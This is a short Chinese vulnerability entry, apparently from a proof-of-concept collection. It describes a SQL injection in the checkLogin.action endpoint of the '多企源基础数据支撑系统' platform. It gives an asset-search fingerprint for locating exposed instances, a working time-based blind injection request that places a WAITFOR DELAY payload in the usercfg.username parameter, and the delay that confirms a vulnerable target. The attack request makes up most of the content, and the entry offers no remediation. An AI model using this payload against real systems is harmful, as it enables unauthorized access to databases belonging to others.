# 多企源基础数据支撑系统checkLogin.action存在SQL注入漏洞

多企源基础数据支撑系统 ｜ SQL注入 ｜ —
- **指纹**：`app="多企源-基础数据支撑系统"`
- **请求**：`POST /json/checkLogin.action?usercfg.username=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **响应特征**：200 响应时间>=5s